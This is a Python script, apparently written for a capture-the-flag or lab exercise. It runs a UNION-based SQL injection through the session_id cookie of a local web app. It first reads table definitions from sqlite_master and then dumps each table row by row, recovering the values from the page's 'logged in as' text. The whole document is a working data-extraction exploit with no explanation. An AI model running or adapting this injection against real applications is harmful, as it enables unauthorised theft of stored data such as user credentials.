import requests

# SQL INJ 1

def get_all_fields(field, table):
    i = 0
    res = []
    while True:
        try:
            r = requests.get("http://127.0.0.1:8000/", headers={"Cookie": "session_id=\"' UNION ALL SELECT {}, '', '0' FROM {} LIMIT {},1 --\"".format(field, table, i)})
            table_name = r.text.split("Вы вошли как ")[1].split("</a>")[0].strip()
            i += 1
            if table_name == "Гость":
                break
            res.append(table_name)
        except Exception as e:
            print(e)
            break
    return res


sqls = get_all_fields("sql", "sqlite_master")
for sql in sqls:
    if sql == "None":
        continue
    data = sql.split(" (")
    table_name = data[0].split(' ')[-1]
    table_fields = [info.split(' ')[0] for info in data[1].split(', ')]
    print(table_name, table_fields)
    datas = {}
    for field in table_fields:
        datas[field] = get_all_fields(field, table_name)
    for i in range(len(datas[table_fields[0]])):
        r = []
        for field in table_fields:
            r.append(datas[field][i])
        print(r)
